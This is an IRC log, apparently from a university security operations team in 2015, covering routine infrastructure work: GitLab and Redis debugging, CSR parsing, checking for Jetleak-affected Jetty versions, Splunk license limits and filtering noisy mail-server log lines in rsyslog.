2015-02-24 16:27:39	jazoff	https://github.com/gitlabhq/gitlab-shell/blob/master/lib/gitlab_post_receive.rb
2015-02-24 16:27:44	jazoff	has error checking though
2015-02-24 16:28:27	jschipp	good to know
2015-02-24 16:31:17	jschipp	lol err: '/dev/null', out: '/dev/null'
2015-02-24 16:31:54	jschipp	i'm making an assumption that that should be written to a log somewhere if it does what I think it does
2015-02-24 16:32:24	jschipp	idk, anyways yeah, this one sucks
2015-02-24 16:32:35	jschipp	I mean debuggng it, i didn't make it that far
2015-02-24 16:33:34	jazoff	ah, i think i know why it might be broken
2015-02-24 16:33:45	jazoff	vaguely remember seeing a bug about the path and the config for redis
2015-02-24 16:34:03	jazoff	i think the host and port needs to be uncommented
2015-02-24 16:34:16	jazoff	    if redis.empty?
2015-02-24 16:34:16	jazoff	      # Default to old method of connecting to redis
2015-02-24 16:34:16	jazoff	      # for users that haven't updated their configuration
2015-02-24 16:34:16	jazoff	      "env -i redis-cli"
2015-02-24 16:34:17	jazoff	    else
2015-02-24 16:34:20	jazoff	      if redis.has_key?("socket")
2015-02-24 16:34:22	jazoff	        "#{redis['bin']} -s #{redis['socket']}"
2015-02-24 16:34:25	jazoff	      else
2015-02-24 16:34:27	jazoff	        "#{redis['bin']} -h #{redis['host']} -p #{redis['port']}"
2015-02-24 16:34:30	jazoff	      end
2015-02-24 16:34:32	jazoff	so i think it ends up runnign redis -h '' -p ''
2015-02-24 16:35:31	jazoff	changed.. see if that fixes it
2015-02-24 16:36:46	jazoff	oh, just noticed you had the socket option there, grr
2015-02-24 16:37:37	jschipp	btw, if you need pulledpork for pulling in suricata rules I just wrote a module or it
2015-02-24 16:37:40	jschipp	lol
2015-02-24 16:37:43	jazoff	oh!
2015-02-24 16:37:45	jazoff	but that socket does not exist
2015-02-24 16:37:52	jschipp	which socket?
2015-02-24 16:37:57	jazoff	/opt/gitlab-6.2.2-0/redis/var/run/redis.sock
2015-02-24 16:38:31	jschipp	hmm, everything says it's running
2015-02-24 16:39:10	jazoff	i think i see what happened
2015-02-24 16:39:23	jazoff	did you refactor the config from gitlab-7.6.2-0 to work for both versions?
2015-02-24 16:39:37	jazoff	it doesnt look like gitlab-6.2.2-0 configures redis to listen on the socket
2015-02-24 16:39:44	jschipp	yes
2015-02-24 16:39:48	jschipp	ah, ferk
2015-02-24 16:40:23	jazoff	easy to fix
2015-02-24 16:40:36	jschipp	soso I need to set the sock in  /opt/gitlab-6.2.2-0/redis/etc/redis.conf
2015-02-24 16:40:54	jazoff	yeah, i'm on it
2015-02-24 16:41:02	jschipp	kk
2015-02-24 16:51:32	jazoff	grrr
2015-02-24 16:52:48	jschipp	LOL
2015-02-24 16:52:55	jschipp	I owe you some food next time you come
2015-02-24 16:52:57	jschipp	:)
2015-02-24 16:56:31	jazoff	oh, i fixed it
2015-02-24 16:57:13	jazoff	can you push something?
2015-02-24 16:58:56	jazoff	also, i think there is a slight problem with nagios+gitlab
2015-02-24 16:59:07	jazoff	it looks like every time nagios hits gitlab a new session gets created, and there are a lot of them
2015-02-24 17:04:30	jazoff	there are ~500,000 sessions
2015-02-24 17:04:53	jazoff	https://github.com/gitlabhq/gitlabhq/blob/master/doc/operations/cleaning_up_redis_sessions.md
2015-02-24 17:06:11	jazoff	ok, setting all session to expire in 24 hours
2015-02-24 17:06:24	jazoff	er, might as well do 10 minutes
2015-02-24 17:06:29	jazoff	you'll just need to login tomorrow
2015-02-24 17:06:46	jazoff	this should make redis ram usage go from 150M to next to nothing
2015-02-24 17:09:19	jschipp	LOL 
2015-02-24 17:09:24	jschipp	okay, I'll check on it
2015-02-24 17:10:19	jschipp	i just pushed the sagan module
2015-02-24 17:11:33	jschipp	jazoff: hmm, didn't show up but looks like your ncsabot commit with the new space was in the activity so it worked for a little bit
2015-02-24 17:11:50	jschipp	heading home though now, gf is visiting
2015-02-24 17:12:01	jschipp	cya
2015-02-24 17:15:13	jazoff	yeah.. i had modified it to dump to stdout and that worked, then i put back the old version
2015-02-24 17:15:16	jazoff	hmm
2015-02-24 17:19:22	jazoff	oh, you need to setup the hook per repo, i dont think youdid that for yours
2015-02-24 17:21:54	jazoff	unless you meant puppet module sagan, but that does not exist
2015-02-24 17:22:13	jazoff	the UI is updating again, so i think it is fixed
2015-02-24 17:23:35	jazoff	redis memory usage:
2015-02-24 17:23:36	jazoff	used_memory_human:154.62M
2015-02-24 17:23:40	jazoff	used_memory_human:4.32M
2015-02-24 17:23:47	jazoff	so, that helps a bit too
2015-02-24 23:40:04	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-24 23:40:04	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-24 23:40:06	--	Mode #security [+]
2015-02-24 23:40:06	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-25 10:47:31	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-25 10:47:31	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-25 10:47:33	--	Mode #security [+]
2015-02-25 10:47:33	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-25 11:09:06	jazoff	of course reading the x509 extensions is a PITA
2015-02-25 11:17:43	jschipp	added a barnyard2 module
2015-02-25 11:25:19	 *	jazoff stabs ssl
2015-02-25 11:26:12	jschipp	lol
2015-02-25 11:28:57	jazoff	grabbing the subject from the csr? easy
2015-02-25 11:29:09	jazoff	grabbing the extensions that include the SAN info? ha
2015-02-25 11:30:23	jschipp	no library to do all the parsing?
2015-02-25 11:31:45	jazoff	cant find one that does the extensions
2015-02-25 11:32:18	jazoff	https://cryptography.io/en/latest/ looks promising
2015-02-25 11:32:26	jazoff	might be able to add support for it
2015-02-25 11:32:55	jschipp	ah
2015-02-25 12:21:39	jazoff	heh, got it to "work" by just parsing openssl output
2015-02-25 12:28:24	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-25 12:28:24	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-25 12:28:26	--	Mode #security [+]
2015-02-25 12:28:26	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-25 12:28:47	jschipp	i've never seen that before, I suppose that's there web application in pe file, wut
2015-02-25 12:41:50	soehlert	wraquel: you have a good place to get POC code? This CVE they want to test is also used for rooting lots of android phones so im all im seeing is that
2015-02-25 12:43:14	wraquel	soehlert: I can query people. But usually no. Which PoC is needed?
2015-02-25 12:43:23	soehlert	CVE-2014-3153
2015-02-25 12:43:32	soehlert	jeremy asked me to test it out
2015-02-25 12:43:37	soehlert	for bw
2015-02-25 12:44:31	wraquel	sigh
2015-02-25 12:44:36	wraquel	I'll see wha ti can find
2015-02-25 12:45:25	soehlert	thats kinda what i thought too. we might need to tread lightly as obviously theres benefit from testing it (helps them decide how hard to push on cray) but they have mentioned having us test EVERY CVE that we want them to fix (basically every 4 and 5 in qualys)
2015-02-25 12:46:04	eyrich	soehlert: turned out that they are running an uptodat ekernel, the qualys alert was for an installed but not running kernel - I neglected to check
2015-02-25 12:46:16	soehlert	ahhh ok well that saves some time :)
2015-02-25 12:48:37	soehlert	eyrich: wanna test qualys key from fog?
2015-02-25 12:48:43	eyrich	yes
2015-02-25 13:44:34	soehlert	jazoff: do you know of any way to get a dump of what all machines are in each branch?
2015-02-25 13:44:55	jazoff	the console should know that
2015-02-25 13:44:59	jazoff	since it is the environment fact
2015-02-25 13:45:12	soehlert	it wasnt able to show all at once last time i checked
2015-02-25 13:45:32	wraquel	What happened to the daily dns mail?
2015-02-25 13:45:42	jazoff	daily dns mail?
2015-02-25 13:45:50	wraquel	[sa-dns] Daily DNS lists: 20140713
2015-02-25 13:45:54	wraquel	That was last one
2015-02-25 13:46:09	wraquel	well
2015-02-25 13:46:27	wraquel	Actually 20140428 was the last one that had info in it
2015-02-25 13:46:41	wraquel	You had a replacement for it. what was it
2015-02-25 13:48:25	jazoff	i did?
2015-02-25 13:48:51	jazoff	oooh, the topN report
2015-02-25 13:49:03	jazoff	oh, nevermind.. that thing, yeah
2015-02-25 13:49:07	wraquel	right....
2015-02-25 13:49:12	wraquel	well.
2015-02-25 13:49:19	jazoff	there's a splunk policy for that
2015-02-25 13:49:20	jazoff	er, bro
2015-02-25 13:49:22	wraquel	Right
2015-02-25 13:49:37	wraquel	topn is talkers. looking for dns requests.
2015-02-25 13:49:39	jazoff	the external_dns log
2015-02-25 13:51:04	jazoff	source=*external_dns* in splunnk
2015-02-25 13:51:29	wraquel	dangit. hitting the license limit again
2015-02-25 14:07:17	wraquel	Has everything been transferred over to splunk-sec from cyclone?
2015-02-25 14:10:03	jazoff	wraquel: just about.. some saved graphs could be moved over
2015-02-25 14:10:16	jazoff	eyrich: did you say you had aruba stock?
2015-02-25 14:10:38	eyrich	jazoff: no, Meru is what I have
2015-02-25 14:10:40	jazoff	oooh
2015-02-25 14:10:58	jazoff	hp is possibly taking over aruba, stock going nuts
2015-02-25 14:11:09	jazoff	of course I dont have any :)
2015-02-25 14:11:44	eyrich	finally HP might have a good wireless product, they have a history of crap ones
2015-02-25 14:28:34	jazoff	well, kinda got a certificate request wizard working
2015-02-25 14:29:27	jazoff	some busy work to do, then some api work and in theory it should be able to request certs
2015-02-25 14:29:53	wraquel	Did you get the api key from CITES?
2015-02-25 14:29:53	soehlert	can we test for jetty via bro known_services/splunk?
2015-02-25 14:29:55	soehlert	http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html
2015-02-25 14:30:09	jazoff	soehlert: software log maybe
2015-02-25 14:30:18	jazoff	things can get tricky if they are fronting jetty with apache/nginx
2015-02-25 14:30:38	jazoff	wraquel: I have access in the test instance, but i haven't been able to get it workign with the api
2015-02-25 14:30:48	soehlert	ya i guess thats more what i was wondering. will bro catch jetty
2015-02-25 14:31:15	wraquel	looks like it does
2015-02-25 14:31:26	wraquel	1424891591.850980141.142.234.968080HTTP::SERVERJetty(767-v20120910Jetty(7.6.7.v20120910)-
2015-02-25 14:31:29	wraquel	man.
2015-02-25 14:31:37	jazoff	tabs confuse irssi
2015-02-25 14:31:39	wraquel	copy/pasting tables cuks.
2015-02-25 14:31:43	wraquel	suycks
2015-02-25 14:31:47	wraquel	...
2015-02-25 14:32:00	jazoff	if you are running apache or nginx in front of jetty is it even vulnerable?
2015-02-25 14:32:14	soehlert	havent read enough yet :)
2015-02-25 14:35:19	soehlert	oh crap, puppet uses jetty no?
2015-02-25 14:35:28	jazoff	it might
2015-02-25 14:35:32	jazoff	the puppetdb thing
2015-02-25 14:35:36	soehlert	ya
2015-02-25 14:35:38	wraquel	If it does, isn't the interface locked down anyway
2015-02-25 14:35:51	soehlert	i mean true, but still
2015-02-25 14:35:54	soehlert	i dont like it
2015-02-25 14:36:18	soehlert	looks like crashplan.ncsa.illinois.edu uses jetty
2015-02-25 14:36:26	soehlert	should i just toss a message to help+its?
2015-02-25 14:36:55	wraquel	Not seeing any version 9.2.x in bro
2015-02-25 14:37:05	soehlert	oh right, forgot that part..
2015-02-25 14:37:09	wraquel	The article says 9.2.3-8
2015-02-25 14:37:42	wraquel	Lots of older versions though.
2015-02-25 14:37:47	jschipp	j/names
2015-02-25 14:37:48	jschipp	err
2015-02-25 14:38:46	soehlert	wraquel: older versions are vulnerable or just that we have them running here?
2015-02-25 14:41:27	wraquel	Oh, that's just what we have here. The article says that 9.2.3 through 9.2.8 are affected.
2015-02-25 14:41:44	soehlert	ok ya just making sure. was gonna ask where you saw other versions affected
2015-02-25 14:50:38	eyrich	https://duo-user.opia.illinois.edu/
2015-02-25 14:51:40	jazoff	yeah, saw that recently.. that's why i've been working on the cert thign and not the duo thing, seems the duo thing is mostly covered
2015-02-25 14:53:35	soehlert	hah he was sending me that cuz of the new phone and all
2015-02-25 14:56:24	wraquel	looks like they have some formatting issues to fix on that page
2015-02-25 14:59:01	soehlert	they have many issues to fix...this doesnt make much sense
2015-02-25 14:59:18	soehlert	at least coming from someone who has managed duo before. maybe if i didnt do thtat it wouldnt be so obviously broken
2015-02-25 14:59:26	wraquel	:D
2015-02-25 14:59:58	wraquel	I set up duo for sshing home.
2015-02-25 15:00:33	soehlert	it says its sending push to my new phone but it doesnt come. i go to manage devices and removed my phone and added a new one and itst still not working. :(
2015-02-25 15:00:33	soehlert	i dont konw how to add the account now. 
2015-02-25 15:00:43	soehlert	yup duo on my home server too
2015-02-25 15:41:01	jazoff	any idea what the max size of a .csr is?
2015-02-25 15:41:43	wraquel	like file size?
2015-02-25 15:42:01	wraquel	I think it varies by keysize and SANS in the request.
2015-02-25 15:42:40	jazoff	yeah
2015-02-25 15:42:48	jazoff	need to size the field in the database for it
2015-02-25 15:42:49	wraquel	I forget what the max number of hosts you can add in the SAN
2015-02-25 15:43:06	wraquel	Well, I think the RFC should have a max for it.
2015-02-25 15:44:32	wraquel	soehlert: I'm not sure if Jeremy got the jist of our converstaion, but I don't think *we* should be running PoC on systems. That should be the admins job. I don't mind us checking versions other non-invasive checks but anything that potentially alters the systems I'm not comfortable with us doing at all.
2015-02-25 15:45:04	jazoff	heh
2015-02-25 15:45:15	jazoff	I broke the voicemail system at UA once by running metasploit against it
2015-02-25 15:45:28	jazoff	granted, it was ran by a bunch of morons
2015-02-25 15:45:45	jazoff	windows domain controllers with rdp and all services running directly exposed to the internet? sure, why not
2015-02-25 15:45:53	soehlert	wraquel: yea i was thinking the same in general (my plan was to test on jyc) i dont mind a one off if we have proper tickets to back us up but i dont think we should be in that business
2015-02-25 16:11:20	wraquel	Did I mention how I broke campus DNS by deprovisioning a system?
2015-02-25 16:13:36	wraquel	At CITES someone wanted the IP address I had for a system that was no longer in use. I said to go ahead and deprovision it, including DNS. Turns out the DNS servers were sending copies of the logs to the FQDN of that host. It went into a vicious loop.
2015-02-25 16:15:00	wraquel	Broke DNS for a day.
2015-02-25 16:23:33	jazoff	fun :)
2015-02-25 16:23:57	jazoff	gah, now that I added support for SANs, the authorization logic needs to be redone
2015-02-25 16:24:16	jazoff	since it needs to find a matching authorization for each alt name
2015-02-25 16:52:19	jazoff	hah, got it working
2015-02-25 16:53:04	jazoff	may need to refactor it a bit to be able to have nicer error messages.. it knows when a CSR is not authorized but it doesnt return which alt_name wasn't allowed so it cant tell the user
2015-02-25 16:56:53	jazoff	I wonder if any other apps get that wrong and dont properly authorize the alt names
2015-02-25 16:57:15	jazoff	since alt names are rather new i could see support for them getting bolted onto an existing app and a check being missing
2015-02-26 11:19:41	jschipp	I think I ate some bad head cheese last night
2015-02-26 11:20:05	wraquel	There's something going around.
2015-02-26 11:55:51	jschipp	jazoff: I don't think the git pull script is working on puppet-sec, I'm having to manually pull
2015-02-26 12:00:12	jazoff	oh?
2015-02-26 12:01:30	jazoff	it just runs git pull in each dir, so it's not doing anything different than you are
2015-02-26 12:49:31	jschipp	I don't think it's automatically pulling like it used to
2015-02-26 12:52:39	jazoff	lets see
2015-02-26 12:54:08	jazoff	oh, i bet it's pointing to the wrong hosname
2015-02-26 12:54:48	jazoff	yep
2015-02-26 12:56:47	jazoff	all better
2015-02-26 12:56:58	jazoff	just needed to change the hook url from puppet-sec.ncsa.illinois.edu to just puppet-sec
2015-02-26 12:57:25	jazoff	the cron job was still working though so it would update on its own every 10 minutes anyway
2015-02-26 13:01:17	eyrich	jazoff: bhr call?
2015-02-26 13:01:45	jazoff	yeah, calling now
2015-02-26 13:02:05	jazoff	always takes longer than i expect to get it going
2015-02-26 13:11:43	wraquel	I thought we were doing IP tracking in git instead of the wiki now.
2015-02-26 14:10:58	jschipp	I'm doing both, there are some things missing in git
2015-02-26 14:11:11	jschipp	i just haven't pushed yet in secops
2015-02-26 14:12:19	jschipp	done
2015-02-26 14:21:59	wraquel	jazoff: did you tweak splunk at all to fix the licensing issues?
2015-02-26 14:25:05	jazoff	no
2015-02-26 14:25:09	jazoff	how much are we over by?
2015-02-26 14:25:18	jazoff	i can likely filter some cruft out before it gets to splunk
2015-02-26 14:33:10	wraquel	I'll check
2015-02-26 14:41:21	wraquel	jazoff: are you able to log into https://splunk.opia.illinois.edu/?
2015-02-26 14:41:29	wraquel	campus password
2015-02-26 14:41:30	wraquel	not NCSA pw.
2015-02-26 14:47:20	jazoff	yes
2015-02-26 14:48:07	jazoff	doesnt looks like you can run the license reports on there either
2015-02-26 14:48:13	jazoff	i guess it needs to run on the license server itself
2015-02-26 14:55:20	wraquel	We were over 1G on the 24th, .25G yesterday.
2015-02-26 15:02:51	jazoff	ah, not too bad
2015-02-26 15:09:05	wraquel	jazoff: they'll fix the licensing perms on their server. You'll have to use your su-jazoff account though.
2015-02-26 15:10:04	jazoff	ah
2015-02-26 15:10:47	jazoff	can you try logging into https://bhr.gw.illinois.edu/admin/ with campus creds?
2015-02-26 15:10:53	jazoff	it should fail since you are not in the DB
2015-02-26 15:12:04	wraquel	yeah, don't work.
2015-02-26 15:12:18	jazoff	great
2015-02-26 15:12:31	jazoff	got krb auth workign instead of django
2015-02-26 15:12:37	jazoff	er, ldap
2015-02-26 15:21:44	jazoff	speaking of splunk.. apparently they are doing good
2015-02-26 15:22:09	jazoff	http://finance.yahoo.com/news/splunk-inc-announces-fiscal-fourth-210200033.html
2015-02-26 15:22:24	jazoff	 Total revenues were $147.4 million, up 48% year-over-year /  License revenues were $98.1 million, up 43% year-over-year
2015-02-26 15:22:42	wraquel	That reminds me that I need to shift my holdings.
2015-02-26 15:23:30	jazoff	heh
2015-02-26 15:23:51	jazoff	i had a small position on in SPLK.. I got out for like a $20 profit.. at the low on 2/3
2015-02-26 15:24:15	jazoff	<- sucks at timing
2015-02-26 15:48:25	jazoff	heh, I just realized the receipts that were entered in the TEM system were printed out and scanned back in
2015-02-26 15:49:38	jschipp	jazoff: thanks it's pulling again
2015-02-26 15:50:16	jazoff	dual homed host strikes again :)
2015-02-26 15:53:43	jschipp	:)
2015-02-27 09:06:38	wraquel	damn it
2015-02-27 09:06:45	wraquel	Error in 'litsearch' command: Your Splunk license expired or you have exceeded your license limit too many times. Renew your Splunk license by visiting www.splunk.com/store or calling 866.GET.SPLUNK
2015-02-27 09:06:58	jazoff	errrr
2015-02-27 09:07:42	wraquel	contacting Matt at cites.
2015-02-27 09:08:50	wraquel	definitely need to trim a little.
2015-02-27 09:09:07	wraquel	If I'm not mistaken, it's a 5 strike in 30 days deal.
2015-02-27 09:09:59	wraquel	Huh. I only see 4 violations.
2015-02-27 09:10:00	wraquel	Not 5.
2015-02-27 09:10:30	jazoff	yeah, i think the bro app blows up the license usage due to the field indexing
2015-02-27 09:10:55	wraquel	Does that need to be optimized. Or can we exclude a few non-essential fields or something?
2015-02-27 09:11:36	jazoff	i think the main thing would be to just filter some of the larger logs a bit more
2015-02-27 09:12:09	wraquel	I think we could probably dump syslog from CC. Just have it go to sec-anlaysis but not go to splunk.
2015-02-27 09:13:06	wraquel	We'd still get the intel and store them in syslog, but just not in splunk. Not sure how much taht would shave though.
2015-02-27 09:13:19	jazoff	yeah.. syslog is 90% that email crap
2015-02-27 09:13:31	jazoff	i think if we filter that it will cut things down by 1/3
2015-02-27 09:15:29	wraquel	amantadine, rimantadine and.... soemthing else. pop.ncsa?
2015-02-27 09:15:34	jazoff	the dines
2015-02-27 09:15:45	jazoff	milter debug lines and crap
2015-02-27 09:16:07	wraquel	Some of those milter lines have auth though. But yeah, a lot of that is cruft.
2015-02-27 09:16:18	jazoff	2015-01-31T00:03:22-06:00 rimantadine.ncsa.uiuc.edu sendmail[6569]: t0V63MDX006569: milter=milter-date, action=header, continue
2015-02-27 09:17:07	wraquel	Do we just want to filter that out before hitting splunk, or altogether?
2015-02-27 09:17:47	jazoff	it's no so bad on the syslog boxes because bzip2 does a good job of that
2015-02-27 09:18:01	jazoff	but we could filter it in syslog before it gets to splunk, or in splunk itself
2015-02-27 09:18:08	jazoff	for just 1/31:
2015-02-27 09:18:08	jazoff	[jazoff@lowp 31]$ bzcat rimantadine*|egrep -c 'milter=milter-[^.]+, action=header, continue'
2015-02-27 09:18:12	jazoff	2944117
2015-02-27 09:18:17	jazoff	3 million useless lines
2015-02-27 09:19:56	jazoff	oh, and 2467671 more from amantadine
2015-02-27 09:20:36	jazoff	ah, and: [jazoff@lowp 31]$ pbzcat rimantadine*| wc -l
2015-02-27 09:20:37	jazoff	5916743
2015-02-27 09:20:47	jazoff	so yeah, about 50% of the lines were just those milter entries
2015-02-27 09:22:50	wraquel	what folder are you in?
2015-02-27 09:22:57	jazoff	/data/syslogs/seclogs/2015/01/31
2015-02-27 09:23:28	wraquel	I'm in /data/syslogs/seclogs/2015/02/23 I thought we had split these up by server
2015-02-27 09:23:40	jazoff	oh, not yet automatically
2015-02-27 09:23:44	wraquel	Ah
2015-02-27 09:23:51	wraquel	So, it comes by after and splits it?
2015-02-27 09:23:55	jazoff	yeah
2015-02-27 09:23:57	wraquel	k
2015-02-27 09:24:00	jazoff	i've been running it at the end of the month
2015-02-27 09:24:11	jazoff	need to work with jschipp to cut over to the new way
2015-02-27 09:24:27	jazoff	need to log daily instead of hourly and then update the archive script
2015-02-27 09:26:45	wraquel	Yeah, that milter stuff is crap.
2015-02-27 09:27:16	wraquel	can we make an rsyslog filter for that on the relays to filter it out before hitting splunk-sec?
2015-02-27 09:27:36	 *	jazoff pokes jschipp 
2015-02-27 09:27:45	jazoff	if not we can do it in splunk if we have to
2015-02-27 09:28:01	wraquel	We can make splunk ignore it so it doesn't index it?
2015-02-27 09:28:07	jazoff	nice to do it on the relays because then that is less traffic and if splunk is down, less to buffer on disk
2015-02-27 09:28:12	jazoff	yeah, you can filter in splunk
2015-02-27 09:28:32	wraquel	can we do that for now so we don't hit a licesning issue again when they fix this?
2015-02-27 09:28:59	wraquel	Matt was tweaking access to our license yesterday. I wonder if he disabled it or something by accident.
2015-02-27 09:29:19	wraquel	Hopefully it's still indexing....
2015-02-27 09:29:34	jazoff	yeah, it should be
2015-02-27 09:31:28	wraquel	vpn is kinda noisy too
2015-02-27 09:31:35	wraquel	Could probably tweak that a little too.
2015-02-27 09:33:06	wraquel	earliest splunk event is 5 years ago... what's that about?
2015-02-27 09:33:19	jazoff	sometimes it gets the date wrong
2015-02-27 09:33:42	wraquel	I listened to Seth's Bro Techburst yesterday.
2015-02-27 09:33:49	jazoff	oooh, that was yeterday?
2015-02-27 09:33:56	wraquel	Yeah, it's online now.
2015-02-27 09:34:10	wraquel	He still pronounces epoch as epic.
2015-02-27 09:34:16	jazoff	:)
2015-02-27 09:34:34	wraquel	There was another one.. I'll have to try to remember.
2015-02-27 09:34:56	wraquel	So you rewrote bro-cut in C? Or was it go?
2015-02-27 09:35:12	jazoff	i did go first, but it wasn't very fast (the python version was the same speed)
2015-02-27 09:35:20	jazoff	then I wrote it in C and daniel fixed it up
2015-02-27 09:35:25	wraquel	nice.
2015-02-27 09:35:31	jazoff	so now it's in C and extremely fast
2015-02-27 09:35:52	wraquel	I asked if it still needed the column definitions to run.
2015-02-27 09:35:57	wraquel	He said yes.
2015-02-27 09:36:09	wraquel	Like, I couldn't grep a few lines and then feed to bro-cut.
2015-02-27 09:36:19	jazoff	yep
2015-02-27 09:36:24	jazoff	no header, it doesnt know what the fields are
2015-02-27 09:38:45	wraquel	perhaps "grep '^#.*|<term>' <logfile> | bro-cut <options>" would work.
2015-02-27 09:39:34	wraquel	oh.. there IS a pgrep...
2015-02-27 09:39:47	wraquel	oh
2015-02-27 09:39:48	wraquel	darn
2015-02-27 09:39:52	wraquel	it's for processes.
2015-02-27 09:40:03	wraquel	guess that wouldn't work anyway.
2015-02-27 09:40:14	jazoff	yeah, we have an alias for that
2015-02-27 09:45:44	wraquel	That should be on a shirt.
2015-02-27 09:46:39	wraquel	ok.... I think we don't have access because ALL campus wide violations count towards the 5 violations limit. Not just our pool, but all pools.
2015-02-27 09:46:59	wraquel	Matt's trying to sort it out now.
2015-02-27 09:47:56	wraquel	ok, they got a reset. We should have access back soon.
2015-02-27 09:51:43	jazoff	ok
2015-02-27 09:53:46	wraquel	daredevil comes out today, doesn't it?
2015-02-27 09:53:54	jazoff	got me
2015-02-27 09:54:01	jazoff	house of cards season 3 is out today
2015-02-27 09:54:04	wraquel	Well, house of cards does at least
2015-02-27 09:54:05	wraquel	:D
2015-02-27 09:54:31	wraquel	Oh. April 10th.
2015-02-27 09:54:59	wraquel	I think DC is trying hard to copy Marvel. Arrow is starting to spin off new DC heros left and right.
2015-02-27 09:55:22	wraquel	Flash, Firestorm, Atom
2015-02-27 10:00:09	wraquel	Ok, splunk is back
2015-02-27 10:00:34	wraquel	esxnode logs are a little verbose too
2015-02-27 10:00:40	wraquel	Could probably stand to tweak those a little.
2015-02-27 10:02:02	jazoff	did you find any milter messages that we should keep?
2015-02-27 10:02:06	jazoff	they all look like cruft to me
2015-02-27 10:02:11	wraquel	I tried.
2015-02-27 10:02:16	wraquel	Not a one had any useful info.
2015-02-27 10:05:16	jazoff	so.. a regex like
2015-02-27 10:06:30	jazoff	sendmail.*milter-
2015-02-27 10:06:34	jazoff	should do it?
2015-02-27 10:07:34	wraquel	yeah
2015-02-27 10:07:38	wraquel	what about lines like this?
2015-02-27 10:07:46	wraquel	2015-01-31T00:00:00-06:00 rimantadine.ncsa.uiuc.edu milter-length[3068]: 06119 t0V5xW8x003811: messages size 1951 bytes
2015-02-27 10:08:01	jazoff	grr
2015-02-27 10:08:43	wraquel	tadine.*milter-
2015-02-27 10:10:37	jazoff	should  we do it in splunk or see if jschipp can do it on the relay?
2015-02-27 10:10:55	jazoff	would likely be easier to do it there
2015-02-27 10:11:17	jazoff	or ask the people that run the mail server why they log so much useless crap
2015-02-27 10:11:17	wraquel	yeah
2015-02-27 10:11:34	wraquel	That would be matt elliott and bill glick.
2015-02-27 10:12:44	wraquel	Or, we can just filter it.
2015-02-27 10:13:08	wraquel	I would filter it in case someday it's of some undeterminable use.
2015-02-27 10:23:34	jazoff	is jschipp around?
2015-02-27 10:23:38	jschipp	yerp
2015-02-27 10:23:50	jazoff	jschipp: what do you know about filtering lines using rsyslog?
2015-02-27 10:23:52	jschipp	what's up?
2015-02-27 10:24:26	jschipp	removing them from the log stream completely?
2015-02-27 10:24:44	jazoff	well, initially at least on the way to splunk
2015-02-27 10:24:49	jazoff	you can still log them to disk you want
2015-02-27 10:25:38	jschipp	haven't done it but I know you can pattern match and filter that way
2015-02-27 10:26:41	jazoff	can we do it? :)
2015-02-27 10:26:49	jschipp	yeah, I can work on it lol
2015-02-27 10:26:54	jazoff	i figure it will help you more if splunk is down it wont have to buffer all that crap
2015-02-27 10:27:23	jschipp	did you want the daily log format changed too?
2015-02-27 10:28:14	jazoff	oh yeah, can you maybe delay that change until 3/1 ?
2015-02-27 10:28:19	jschipp	sth like?  /usr/local/logs/%$YEAR%/%$MONTH%/%$DAY%/%HOSTNAME%.log
2015-02-27 10:28:25	jschipp	sure
2015-02-27 10:28:28	jazoff	yeah, what is it now ?
2015-02-27 10:28:31	jschipp	/usr/local/logs/%$YEAR%/%$MONTH%/%$DAY%/%HOSTNAME%_%$YEAR%%$MONTH%%$DAY%%$HOUR%.log
2015-02-27 10:28:40	jazoff	oh, hmm
2015-02-27 10:28:44	jazoff	i think we actually want
2015-02-27 10:28:54	jazoff	/usr/local/logs/%$YEAR%/%$MONTH%/%$DAY%/%HOSTNAME%_%$YEAR%%$MONTH%%$DAY%.log
2015-02-27 10:29:21	jschipp	kk
2015-02-27 10:29:23	jazoff	othewise all the log files for a single host end up with the exact same filename and it is hard to temporarily copy them to some place else
2015-02-27 10:30:37	jazoff	eyrich: so the BHR project is progressing well..
2015-02-27 10:30:41	wraquel	Did you transfer searches over from cyclone to splunk jazoff ?
2015-02-27 10:30:55	jazoff	no.. I'm not sure how much of a PITA that is
2015-02-27 10:31:06	jazoff	I _think_ there might be a config file that can be copied as-is
2015-02-27 10:31:38	jazoff	i hate that splunk is so GUI focused for changing configs like that
2015-02-27 10:31:52	jazoff	you can build an internal app and upload it, but then as soon as you change something it gets out of sync
2015-02-27 10:37:51	jschipp	jazoff: what was the log message you wanted filtered?
2015-02-27 10:38:14	jazoff	so, we want to filter the milter messages from the mail servers
2015-02-27 10:38:20	wraquel	yes
2015-02-27 10:38:24	wraquel	oh, not a question.
2015-02-27 10:38:54	jazoff	jschipp: can you filter host + message?
2015-02-27 10:39:02	jazoff	actuall, i think the host is in the message
2015-02-27 10:39:16	jschipp	yeah
2015-02-27 10:39:47	jazoff	so the *mantadine hosts and message contains 'milter'
2015-02-27 10:40:14	jazoff	or Milter possibly, those are different
2015-02-27 10:52:32	wraquel	jazoff: did you set up a monthly alert for the BHR block numbers?
2015-02-27 10:52:44	jazoff	oh, derp
2015-02-27 10:52:50	jazoff	i wrote the sql query
2015-02-27 10:52:58	wraquel	Can you get me the numbers for Dec and Jan?
2015-02-27 10:53:02	jazoff	1 sec
2015-02-27 10:53:06	wraquel	danke
2015-02-27 10:53:21	jazoff	query running, piped to email you
2015-02-27 10:53:59	wraquel	awesome
2015-02-27 10:56:36	jschipp	is cyclone no  longeru p?
2015-02-27 10:56:53	jazoff	you dont need to send logs to it
2015-02-27 10:57:06	jschipp	oh
2015-02-27 10:57:36	wraquel	It's up. but yeah, you can probably stop sending logs to it now.
2015-02-27 10:58:36	jschipp	hmm
2015-02-27 10:58:37	jschipp	[root@relay02-sec ~]# /usr/local/nagios/libexec/check_tcp -H 141.142.148.16:1514 -p 1514
2015-02-27 10:58:38	jschipp	TCP CRITICAL - Invalid hostname, address or socket: 141.142.148.16:1514
2015-02-27 10:58:43	jschipp	err
2015-02-27 10:58:49	jschipp	nvm
2015-02-27 10:58:57	jazoff	:)
